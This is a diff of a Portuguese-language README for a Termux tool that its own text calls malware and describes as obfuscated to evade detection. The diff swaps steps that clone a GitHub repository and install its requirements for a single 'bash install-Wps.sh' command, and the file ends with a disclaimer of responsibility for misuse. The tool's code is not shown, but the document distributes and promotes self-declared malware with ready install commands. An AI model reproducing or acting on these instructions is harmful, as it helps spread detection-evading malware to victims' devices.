@@ -13,18 +13,7 @@ OBS: O CÓDIGO FOI OFUSCADO E DIMINUIDO, PARA DIFICULTAR A DETECÇÃO. VOCÊ VAI
 
 INSTALAÇÃO (TERMUX):
 
-1- pkg install python3
-
-2- pkg install git
-
-3- git clone https://github.com/DarkZer010/TWps
-
-
-4- cd TWps
-
-5- pip install -r requirements.txt
-
-6- python3
+1- bash install-Wps.sh
 
 !! O criador desse malware não se responsabiliza pelo uso indevido do script !!
 
